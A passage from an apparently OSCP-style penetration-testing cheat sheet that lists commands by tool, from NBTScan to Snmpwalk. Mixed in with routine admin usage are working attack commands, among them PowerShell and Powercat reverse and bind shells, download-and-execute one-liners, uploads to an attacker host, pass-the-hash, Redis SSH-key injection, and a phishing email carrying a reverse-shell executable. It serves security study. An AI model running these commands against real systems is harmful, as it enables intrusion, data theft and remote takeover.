  ```

- **Show Databases**:
  ```sql
  SHOW DATABASES;
  ```

### NBTScan
- **Scan a Network for NetBIOS Names**:
  ```bash
  nbtscan <IP_range>
  ```

- **Scan with Verbose Output**:
  ```bash
  nbtscan -v <IP_range>
  ```
- **Scan a subnet for NetBIOS names using nbtscan**:
  ```bash
  nbtscan -r <IP_range>
  sudo nbtscan -r 10.11.1.0/24
  ```
---
### Nessus
- **Verifying the integrity of the downloaded Nessus package by checking its SHA-256 checksum and installing it**:
  ```bash
  sha256sum Nessus-X.X.X.deb
  sudo apt install ./Nessus-X.X.X.deb
  
  ```

- **Start Nessus Service**:
  ```bash
  systemctl start nessusd
  sudo /etc/init.d/nessusd start
  ```

- **Check Nessus Status**:
  ```bash
  systemctl status nessusd
  ```
---
### Net
- **List Shared Resources**:
  ```cmd
  net share
  ```

- **Stop a Service**:
  ```cmd
  net stop <service_name>
  ```
- **Creating a New User:**:
  ```cmd
  net user /add tester password
  ```

- **Listing Local Groups:**:
  ```cmd
  net localgroup
  ```
- **Adding User to Administrators Group:**:
  ```cmd
  net localgroup Administrators tester /add
  ```

- **Removing User from Administrators Group:**:
  ```cmd
  net localgroup Administrators tester /del
  ```
- **Listing Account Policies:**:
  ```cmd
  net accounts
  ```

- **Accessing Shared Network Resource:**:
  ```cmd
  net use \\192.168.1.1\public
  ```
- **Stopping and Starting Windows Search Service:**:
  ```cmd
  net stop WSearch
  net start WSearch
  ```

- **Changing User Password:**:
  ```cmd
  net user admin Ev!lpass
  ```
- **Post Exploitation: Adding a New User to RDP and admin group:**:
  ```cmd
  net user test-user tester /add
  net localgroup administrators /add tester
  net localgroup "Remote Desktop Users" /add tester
  ```

---
### Netsh
- **Show Wireless Profiles**:
  ```cmd
  netsh wlan show profiles
  ```

- **Export a Wireless Profile**:
  ```cmd
  netsh wlan export profile name="<profile_name>" key=clear folder=<output_folder>
  ```
- **Viewing the firewall settings for all profiles (Domain, Private, Public):**:
  ```cmd
  netsh advfirewall show allprofiles
  ```

- **Add Firewall Rules: Blocking incoming ping requests from a specific IP**:
  ```cmd
  netsh advfirewall firewall add rule name="Deny Ping OffSec" dir=in action=block protocol=icmpv4 remoteip=192.124.249.5
  ```
- **Showing a specific rule:**:
  ```cmd
  netsh advfirewall firewall show rule name="Deny Ping OffSec"
  ```

- **Deleting a specific rule:**:
  ```cmd
  netsh advfirewall firewall delete rule name="Deny Ping OffSec"
  ```
- **Blocking outbound traffic to a specific IP:**:
  ```cmd
  netsh advfirewall firewall add rule name="Block OffSec" remoteip=192.124.249.5 dir=out enable=yes action=block
  ```

- **Block outbound TCP traffic to a specific IP and port (443):**:
  ```cmd
  netsh advfirewall firewall add rule name="Block OffSec" remoteip=192.124.249.5 dir=out enable=yes action=block remoteport=443 protocol=tcp
  ```
- **Local Port Forwarding Using netsh and Listing/Mounting the remote share available on the Windows 2016 Server machine through a port forward and**:
  ```cmd
  netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
  sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Tester,password=password /mnt/win10_share ls -l /mnt/win10_share/ 
  smbclient -L 10.11.0.22 --port=4455 --user=Administrator
  ```
  This command forwards traffic that is sent to port 4455 on 10.11.0.22 to port 445 on 192.168.1.110
- ** Allowing Inbound Traffic on a Specific Port**:
  ```cmd
  netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
  ```

---
### Netstat
- **Show All Connections**:
  ```bash
  netstat -a
  ```

- **Show Listening Ports**:
  ```bash
  netstat -l
  ```

- **Show Connections by Process**:
  ```bash
  netstat -p
  ```
- **The command displays listening TCP/UDP ports, the processes using them, and more detailed connection info.**:
  ```bash
  netstat -tulpen
  ```

- ** This command will display TCP and UDP connections along with their respective states and the processes responsible for them.**:
  ```bash
  netstat -natup
  ```

---
### Nslookup
- **Query an IP Address**:
  ```bash
  nslookup <hostname>
  ```

- **Set a Different DNS Server**:
  ```bash
  nslookup <hostname> <DNS_server>
  ```
- **Example: Running nslookup to query the SRV record for LDAP services on a Domain Controller**:
  ```bash
  C:\Windows\system32>nslookup
  nslookup
  DNS request timed out.
      timeout was 2 seconds.
  Default Server:  UnKnown
  Address:  10.5.5.30
  
  > set type=all
  > _ldap._tcp.dc._msdcs.sandbox.local
  Server:  UnKnown
  Address:  10.5.5.30
  
  _ldap._tcp.dc._msdcs.sandbox.local      SRV service location:
            priority       = 0
            weight         = 100
            port           = 389
            svr hostname   = SANDBOXDC.sandbox.local
  SANDBOXDC.sandbox.local internet address = 10.5.5.30
  > exit
  
  C:\Windows\system32>
  ```
---
### OneSixtyOne
- **Scan SNMP Devices**:
  ```bash
  onesixtyone -c <community_string_list> <IP_range>
  ```

- **Use a Specific Community String**:
  ```bash
  onesixtyone -s <community_string> <IP_range>
  ```
- **Create a file named 'community' containing SNMP community strings, generate IP addresses and Use the onesixtyone tool to scan the IPs**:
  ```bash
  echo public > community
  echo private >> community
  echo manager >> community
  for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
  onesixtyone -c community -i ips
  ```
---
### OpenSSL
- **Generate a Private Key**:
  ```bash
  openssl genpkey -algorithm RSA -out private.key
  ```

- **Create a Self-Signed Certificate**:
  ```bash
  openssl req -x509 -new -key private.key -out cert.pem -days 365
  ```
- ** Generate a hashed password using OpenSSL and a custom salt for user authentication**:
  ```bash
  openssl passwd -1 -salt test pass123
  ```
---
### Passwd
- **Change Your Password**:
  ```bash
  passwd
  ```

- **Change Password for Another User**:
  ```bash
  sudo passwd <username>
  ```
- **Check the status of the user 'tester' (e.g., account locked, password status, etc.)**:
  ```bash
  passwd --status tester
  ```

- **Display password aging and account expiration information for the user 'tester'**:
  ```bash
  chage -l jane
  ```
---
### PHPGGC
- **Generate a PHP Gadget Chain**:
  ```bash
  phpggc <gadget> -o <output_file>
  ```

- **List Available Gadget Chains**:
  ```bash
  phpggc -l
  ```
- ** Generate a PHP payload using PHPGGC for Symfony Remote Code Execution (RCE4) to execute a command**:
  ```bash
  phpggc Symfony/RCE4 exec 'cat /home/tester/secret.txt' | base64
  ```
---
### Plink
- **Initiate an SSH Connection**:
  ```bash
  plink -ssh <username>@<host>
  ```

- **Execute a Command on a Remote Host**:
  ```bash
  plink -ssh <username>@<host> <command>
  ```
- **Setting up remote port forwarding on a remote host using Plink**:
  ```bash
  plink.exe -ssh -l tester -pw password -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
  ```

- **Establishing a remote tunnel using Plink in non-interactive mode**:
  ```bash
  cmd.exe /c echo y | plink.exe -ssh -l user -pw password -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
  ```
---
### Powercat
- **Start a Listener**:
  ```powershell
  powercat -l -p <port> -t <protocol>
  ```

- **Send a File**:
  ```powershell
  powercat -c <host> -p <port> -i <file>
  ```
- **File Transfer with Powercat:**:
  ```powershell
  powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
  sudo nc -lnvp 443 > receiving_powercat.ps1
  ```

- **Reverse Shell with Powercat:**:
  ```powershell
  powercat -c 10.11.0.4 -p 443 -e cmd.exe
  sudo nc -lvp 443
  ```
- **Bind Shell with Powercat:**:
  ```powershell
  powercat -l -p 443 -e cmd.exe
  nc 10.11.0.22 443
  ```

- **Generating Powercat Stand-Alone Payloads:**:
  ```powershell
  powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
  ./reverseshell.ps1
  ```
- **Creating an Encoded Stand-Alone Payload:**:
  ```powershell
  powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
  ```
- **Executing an Encoded Stand-Alone Payload:**:
  ```powershell
  powershell.exe -E <Encoded-Payload>
  ./reverseshell.ps1
  ```

### PowerShell
- **Run a Script**:
  ```powershell
  powershell -File <script.ps1>
  ```

- **Execute a Command**:
  ```powershell
  powershell -Command "<command>"
  ```
- **Download Tools(Powercat) using PowerShell**:
  ```powershell
  powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
  iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/whoami.exe', 'C:\Users\Public\whoami.exe')

  ```
  iex executes the downloaded PowerShell script.
- **Run a Script**:
  ```powershell
  powershell -File <script.ps1>
  ```
- **PowerShell Execution Policy**:
  ```powershell
  Set-ExecutionPolicy Unrestricted
  Get-ExecutionPolicy
  ```
- **Remote PowerShell Sessions**:
  ```powershell
  $dcsesh = New-PSSession -Computer SANDBOXDC
  Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
  ```
- **File Transfers**:
  ```powershell
  #Powershell
  #Creating a PowerShell HTTP downloader script
  
  echo $webclient = New-Object System.Net.WebClient >>wget.ps1
  echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
  echo $file = "new-exploit.exe" >>wget.ps1
  echo $webclient.DownloadFile($url,$file) >>wget.ps1
  #Executing the PowerShell HTTP downloader script
  powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
  
  #Powershell
  #One-liner
  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
  
  #Powershell
  #One-liner Executing a remote PowerShell script directly from memory
  powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
  Invoke-WebRequest -Uri "http://192.168.49.52/winPEASany.exe" -OutFile "winpeas.exe"
  #Powershell
  #Windows Downloads with exe2hex and PowerShell
  #PowerShell command to rebuild nc.exe
  upx -9 nc.exe
  exe2hex -x nc.exe -p nc.cmd
  
  powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
  
  
  #Powershell
  #PHP script to receive HTTP POST request
  #PowerShell command to upload a file to the attacker machine
  <?php
  $uploaddir = '/var/www/uploads/';
  
  $uploadfile = $uploaddir . $_FILES['file']['name'];
  
  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
  ?>
  
  powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.168/upload.php', 'important.docx')
  ```
- **VBScript: Creating a VBScript HTTP downloader script**:
  ```powershell
  echo strUrl = WScript.Arguments.Item(0) > wget.vbs
  echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
  echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
  echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
  echo  Err.Clear >> wget.vbs
  echo  Set http = Nothing >> wget.vbs
  echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
  echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
  echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
  echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
  echo  http.Open "GET", strURL, False >> wget.vbs
  echo  http.Send >> wget.vbs
  echo  varByteArray = http.ResponseBody >> wget.vbs
  echo  Set http = Nothing >> wget.vbs
  echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
  echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
  echo  strData = "" >> wget.vbs
  echo  strBuffer = "" >> wget.vbs
  echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
  echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
  echo  Next >> wget.vbs
  echo  ts.Close >> wget.vbs
  
  #VBScript
  #Executing the VBScript HTTP downloader script
  cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
  ```
- **File Transfers: FTP**:
  ```powershell
  #FTP
  #Installing Pure-FTP on Kali
  sudo apt update && sudo apt install pure-ftpd
  
  #FTP
  #Bash script to setup Pure-FTP on Kali
  #cat ./setup-ftp.sh
  #!/bin/bash
  sudo groupadd ftpgroup
  sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
  sudo pure-pw useradd offsec -u ftpuser -d /ftphome
  sudo pure-pw mkdb
  cd /etc/pure-ftpd/auth/
  sudo ln -s ../conf/PureDB 60pdb
  sudo mkdir -p /ftphome
  sudo chown -R ftpuser:ftpgroup /ftphome/
  sudo systemctl restart pure-ftpd
  
  #FTP
  #Creating the non-interactive FTP script
  
  echo open 10.11.0.4 21> ftp.txt
  echo USER offsec>> ftp.txt
  echo lab>> ftp.txt
  echo bin >> ftp.txt
  echo GET nc.exe >> ftp.txt
  echo bye >> ftp.txt
  
  #FTP
  #Using FTP non-interactively
  ftp -v -n -s:ftp.txt

  ```
- **File Transfers: TFTP**:
  ```powershell
  #TFTP
  #Setting up a TFTP server on Kali
  kali@kali:~$ sudo apt update && sudo apt install atftp
  kali@kali:~$ sudo mkdir /tftp
  kali@kali:~$ sudo chown nobody: /tftp
  kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
  
  #TFTP
  #Uploading files to our Kali machine using TFTP
  tftp -i 10.11.0.4 put important.docx

  ```

- **Reverse Shell One-Liner**:
  ```powershell
  powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```
- **Persistent Reverse Shell**:
  ```powershell
  $client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
  $stream = $client.GetStream();
  [byte[]]$bytes = 0..65535|%{0};
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
  {
      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
      $sendback = (iex $data 2>&1 | Out-String );
      $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
      $stream.Write($sendbyte,0,$sendbyte.Length);
      $stream.Flush();
  }
  $client.Close();
  ```
- **Bind Shell**:
  ```powershell
  powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
  ```
- **File Extraction and Archive Handling**:
  ```powershell
  Expand-Archive -Path .\PSTools.zip -DestinationPath C:\Windows\System32\
  ```
- **PowerShell Enumeration**:
  ```powershell
  echo $PSVersionTable
  Get-Command -Noun file
  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status
  Get-Service | Get-Member
  Get-Service | Select-Object -Property "DisplayName","MachineName","ServiceType","StartType","Status"
  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending
  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object StartType -EQ Automatic
  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object StartType -EQ Automatic | Format-List
  Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"}
  Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"} | Format-Table

  ```
- **PowerShell Remote Access**:
  ```powershell
  Enable-PSRemoting
  Invoke-Command -ComputerName 192.168.50.80 -ScriptBlock { ipconfig } -Credential offensive

  ```
- **Set Trusted Hosts**:
  ```powershell
  Set-Item wsman:\localhost\client\trustedhosts 192.168.50.80

  ```
- **Run a new cmd.exe process with elevated privileges**:
  ```powershell
  powershell.exe Start-Process cmd.exe -Verb runAs

  ```
- **Execute a script:**:
  ```powershell
  powershell.exe -exec bypass C:\Users\vandelay\Desktop\computerInfo.ps1

  ```
- **Miscellaneous PowerShell Commands**:
  ```powershell
  Get-Verb
  Get-Help Get-Help
  Get-Alias
  Get-Module -ListAvailable
  Get-Help Start-MpScan
  Start-MpScan -ScanPath 'C:\\Users\\User\\' -ScanType QuickScan

  ```

---
### PsExec
- **Execute a Command on a Remote Host**:
  ```cmd
  psexec \\<host> -u <username> -p <password> <command>
  psexec \\192.168.50.80 -u tester -p password ipconfig
  ```
- **Run Interactive Shell**:
  ```cmd
  psexec \\<host>
  ```
- **Running Command on Specific User Session:**:
  ```cmd
  psexec -i \\myComputer cmd /c "systeminfo"
  ```

- **Running Command as Different User:**:
  ```cmd
  psexec -i \\myComputer -u username -p password cmd
  ```
- **onnecting to Domain Controller (DC/Windows)**:
  ```cmd
  .\PsExec.exe /accepteula \\dc01 cmd.exe
  ```

- **Running Impacket PsExec Example**:
  ```cmd
  /usr/bin/impacket-psexec "username:password"@192.168.205.59 cmd.exe
  ```
- **Gaining System Shell Using Impacket:**:
  ```cmd
  python3 /usr/share/doc/python3-impacket/examples/psexec.py pc.domain/tester:password@192.168.120.116
  /usr/share/doc/python3-impacket/examples/psexec.py admin@10.129.254.45
  ```

### PTH-Winexe
- **Run a Command with Pass-the-Hash**:
  ```bash
  pth-winexe -U <domain>/<username>%<hash> //<target_ip> <command>
  ```
- **Using pth-winexe to pass the hash and execute a command on a remote Windows machine**:
  ```bash
  pth-winexe -U tester%aad3b435b5dsdfsdfb435b51404ee:2892d26csdfdsfb9f05c425e //10.11.0.22 cmd
  ```
### Python
- **Run a Python Script**:
  ```bash
  python <script.py>
  ```

- **Start Python Interactive Shell**:
  ```bash
  python
  ```
- **Run a Python Script**:
  ```bash
  python <script.py>
  ```

- **Start Python Interactive Shell**:
  ```bash
  python
  ```
- **Run a Python Script**:
  ```bash
  python <script.py>
  ```

- **Start Python Interactive Shell**:
  ```bash
  python
  ```

### Recon-ng
- **Start Recon-ng Framework**:
  ```bash
  recon-ng
  ```

- **Searching the Marketplace for Modules(GitHub):**:
  ```bash
  marketplace search github
  ```
- **Getting Information on a Module:**:
  ```bash
  marketplace info recon/domains-hosts/google_site_web
  ```

- **Load a Module**:
  ```bash
  use <module>
  modules load recon/domains-hosts/google_site_web
  ```
- **Installing a Module**:
  ```bash
  marketplace install recon/domains-hosts/google_site_web
  ```

- **#Using recon/domains-hosts/google_site_web and setting the source**:
  ```bash
  modules load recon/domains-hosts/google_site_web
  info
  options set SOURCE megacorpone.com
  ```


### Redis
- **Connect to Redis CLI**:
  ```bash
  redis-cli
  ```

- **Flush All Data**:
  ```bash
  redis-cli FLUSHALL
  ```
- **Injecting SSH Public Key into Redis**:
  ```bash
  ssh-keygen -t rsa
  (echo -e "\n\n"; cat key.pub ; echo -e "\n\n") > key.txt
  cat key.txt | redis-cli -h 127.0.0.1 -a 'sgm5ZgaRCTOE6QpyCojpyr+Rix12VYbdOkA' -x set s-key
  
  ```

- **Update Redis Configuration to Allow SSH Key Injection:**:
  ```bash
  redis-cli -h 127.0.0.1 -a 'sgm5ZgaRCTOE6QpyCojpyr+Rix12VYbdOkA' 
  127.0.0.1:6379> config get dir
  2) "/var/redis/6379"
  127.0.0.1:6379> config set dir /root/.ssh
  OK
  127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
  OK
  127.0.0.1:6379> save
  OK
  --> exit
  ssh root@192.168.120.51 -i key
  ```

### Reg
- **Query a Registry Key**:
  ```cmd
  reg query <key_path>
  ```

- **Add a Registry Key**:
  ```cmd
  reg add <key_path> /v <value_name> /t <type> /d <data>
  ```
- **Query the "RunOnce" key in the registry for current user (HKCU)**:
  ```cmd
  reg query hkcu\software\microsoft\windows\currentversion\runonce
  ```

- **Query the "Run" key in the registry for current user (HKCU)**:
  ```cmd
  reg query hkcu\software\microsoft\windows\currentversion\run
  ```
- **Delete all values under the "Run" key for the current user (HKCU)**:
  ```cmd
  reg delete hkcu\software\microsoft\windows\currentversion\run /va
  ```

- **Add a new entry to the "Run" key for the current user (HKCU)**:
  ```cmd
  reg add hkcu\software\microsoft\windows\currentversion\run /v OneDrive /t REG_SZ /d "C:\Users\Offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
  ```
- **Export the "Environment" key for the current user (HKCU) to a file**:
  ```cmd
  reg export hkcu\environment environment
  ```

### Responder
- **Start Responder**:
  ```bash
  responder -I <interface>
  sudo responder -I tap0
  ```

- **Run in Analysis Mode**:
  ```bash
  responder -I <interface> -A
  ```
- **Running Responder on the 'eth0' interface in verbose mode**:
  ```bash
  responder -I eth0 -rv
  ```
- **Running Responder on our active network interface to capture NTLMv2 handshakes**:
  ```bash
  responder -I eth0 
  curl http://192.168.120.91:8080/?url=http://our-ip
  ```
   It's often used in situations like Server-Side Request Forgery (SSRF) attacks, where an attacker can make a server request another service or system within the same 
   network.
### Rinetd
- ** Update package lists and install rinetd from the Kali Linux repositories**:
  ```bash
  sudo apt update && sudo apt install rinetd
  ```

- **Add Port Forwarding Rule**:
  ```bash
  echo "<bind_ip> <bind_port> <target_ip> <target_port>" >> /etc/rinetd.conf
  ```
- **Add a port forwarding rule to the rinetd configuration file (/etc/rinetd.conf)**:
  ```bash
  cat /etc/rinetd.conf
  0.0.0.0 80 216.58.207.142 80
  ```

- **Restart Rinetd**:
  ```bash
  systemctl restart rinetd
  ```

- **Restart Rinetd**:
  ```bash
  systemctl restart rinetd
  ```

### Rlwrap
- **Wrap a Command with Readline**:
  ```bash
  rlwrap <command>
  ```

- **Specify History File**:
  ```bash
  rlwrap -H <history_file> <command>
  ```
- **Use rlwrap with netcat (nc) for a better reverse shell experience**:
  ```bash
  rlwrap -cAr nc -lvnp 443
  ```

### Rpcclient
- **Connect to an SMB Server**:
  ```bash
  rpcclient -U <username> <target_ip>
  ```

- **Enumerate Users**:
  ```bash
  enumdomusers
  ```
- ** List the user accounts on the domain using rpcclient(anonymous login)**:
  ```bash
  rpcclient -W '' -c querydispinfo -U ''%'' '192.168.155.175'
  ```

### RSMangler
- **Generate Wordlists**:
  ```bash
  rsmangler --file <input_file> -o <output_file>
  ```

- **Use Custom Rules**:
  ```bash
  rsmangler --file <input_file> --rules
  ```
- **Using RSMangler to generate permutations of the wordlist**:
  ```bash
  echo bird > wordlist.txt
  echo cat >> wordlist.txt
  echo dog >> wordlist.txt
  rsmangler --file wordlist.txt
  ```
- **Saving the Mangled Output to a File**:
  ```bash
  rsmangler --file wordlist.txt --output mangled.txt
  ```
- **Piping a wordlist into RSMangler**:
  ```bash
  cat wordlist.txt | rsmangler --file -
  ```
- **Mangling Wordlist with Character Limits**:
  ```bash
  rsmangler --file wordlist.txt --min 12 --max 13
  ```
- **Combining RSMangler with Aircrack-ng**:
  ```bash
  rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w -
  ```
### Runas
- **Run a Program as Another User**:
  ```cmd
  runas /user:<username> "<command>"
  ```

- **Use Password Prompt**:
  ```cmd
  runas /user:<username> /savecred "<command>"
  ```
- **Running the command without loading the user's profile (no environment variables from the profile are set)**:
  ```cmd
  runas /noprofile /user:mymachine\tester cmd
  ```

### SC
- **Query Service Status**:
  ```cmd
  sc query <service_name>
  ```

- **Start a Service**:
  ```cmd
  sc start <service_name>
  sc start WSearch
  ```
- **Query Service Status**:
  ```cmd
  sc query <service_name>
  sc query dhcp
  ```

- **Configuring the Windows Search service to start automatically**:
  ```cmd
  sc config WSearch start=auto
  ```
  
### Schtasks
- **Create a Scheduled Task**:
  ```cmd
  schtasks /create /tn <task_name> /tr <command> /sc <schedule> /st <start_time>
  ```

- **Delete a Scheduled Task**:
  ```cmd
  schtasks /delete /tn <task_name>
  ```
- **Create a scheduled task named "runme" to run the program "C:\runme.exe" every Monday at 9:00 AM**:
  ```cmd
  schtasks /create /sc weekly /d mon /tn runme /tr C:\runme.exe /st 09:00
  ```
- **Delete the scheduled task named "runme"**:
  ```cmd
  schtasks /delete /tn runme
  ```
- **Recreate the scheduled task named "runme" with the same configuration (weekly, every Monday, 9:00 AM)**:
  ```cmd
  schtasks /create /sc weekly /d mon /tn runme /tr C:\runme.exe /st 09:00
  ```
- ** Query details of the scheduled task named "runme" and display the output in list format**:
  ```cmd
  schtasks /query /TN runme /fo LIST
  ```

### SCP
- **Copy a File to a Remote Server**:
  ```bash
  scp <file> <username>@<host>:<remote_path>
  ```

- **Copy a File from a Remote Server**:
  ```bash
  scp <username>@<host>:<remote_file> <local_path>
  scp -P 2222 tester@192.168.166.52:/challenge/flag.txt /tmp/flag.txt
  ```
- **Copy a File to a Remote Server**:
  ```bash
  scp <file> <username>@<host>:<remote_path>
  scp -r /home/mindsflee/test.txt kali@192.168.49.124:/tmp/test.txt
  ```

### Sed
- **Replace Text in a File**:
  ```bash
  sed -i 's/<old_text>/<new_text>/g' <file>
  ```

- **Print Specific Lines**:
  ```bash
  sed -n '<line_number>p' <file>
  ```
  
- **Update the UID in the /etc/passwd file**:
  ```bash
  sudo sed -i -e 's/1001/1014/g' /etc/passwd
  ```
  This command replaces all occurrences of the UID '1001' with '1014' in the /etc/passwd file.
### SendEmail
- **Send an Email**:
  ```bash
  sendEmail -f <from_address> -t <to_address> -u <subject> -m <message> -s <smtp_server> -xu <username> -xp <password>
  ```

- **Attach a File**:
  ```bash
  sendEmail -f <from_address> -t <to_address> -u <subject> -m <message> -s <smtp_server> -a <file_path>
  ```
- **Send an email with an attachment using the sendEmail tool**:
  ```bash
  sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.177.55 -u "Important urgent patch Upgrade Instructions" -a /tmp/windows_reverse.exe
  ```

### SharpHound
- **Collect Data for BloodHound**:
  ```cmd
  SharpHound.exe -c All
  ```
  This is useful for gathering comprehensive information about the target environment’s attack surface in Active Directory.
- **Compress Output Files**:
  ```cmd
  SharpHound.exe -c All --zip
  ```

### Shellter
- **Run Shellter in Automatic Mode**:
  ```bash
  shellter -a
  ```

- **Specify Input and Output Files**:
  ```bash
  shellter -a -f <input_exe> -o <output_exe>
  ```

### Smbclient
- **Connect to an SMB Share(Windows/Linux)**:
  ```bash
  smbclient //<server>/<share>
  smbclient //192.168.120.116/DocumentsShare -U username
  smbclient -U 'username%password' //192.168.155.175/Password\ Audit
  smbclient \\\\10.129.255.88\\backups -U user

  ```

- **Listing SMB Shares**:
  ```bash
  smbclient -L <target_ip> -U <username>
  smbclient -L \\192.168.155.175 -U 'username%password'
  smbclient -N -L 192.168.120.116
  ```
- **Updating SMB Protocol to SMBv2**:
  ```bash
  sudo nano /etc/samba/smb.conf
  min protocol = SMB2
  sudo /etc/init.d/smbd restart
  
  ```

- **Recursive File Download with SMB**:
  ```bash
  smbclient -U 'username%password' //192.168.155.175/Password\ Audit
  smb: \> prompt off
  smb: \> recurse on
  smb: \> mget *
  ```
- **Uploading a Web Shell and Executables**:
  ```bash
    smbclient -U 'username%password' //192.168.155.175/Password\ Audit
    smb: \> put shell.php
    smb: \> put nc.exe
    smb: \> exit
  ```

- **Download a File**:
  ```bash
  get <file_name>
  ```
- **Connect to an SMB Share**:
  ```bash
  smbclient //<server>/<share>
  ```

- **Download a File**:
  ```bash
  get <file_name>
  ```

### Snmpwalk
- **Query an SNMP Device**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address>
  ```

- **Specify an OID: Enumerate open TCP ports on the target using SNMP**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
  snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
  ```
- **Enumerate the entire MIB tree on the target using SNMPv1**:
  ```bash
  snmpwalk -c public -v1 -t 10 10.11.1.14
  ```
- **Enumerate Windows users on the target using SNMP**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
  snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
  ```
  1.3.6.1.4.1.77.1.2.25: OID (Object Identifier) for listing Windows user accounts.
- **Enumerate installed software on the target using SNMP**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
  snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
  ```

- **Enumerate running Windows processes on the target using SNMP**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
  snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
  ```

### Socat
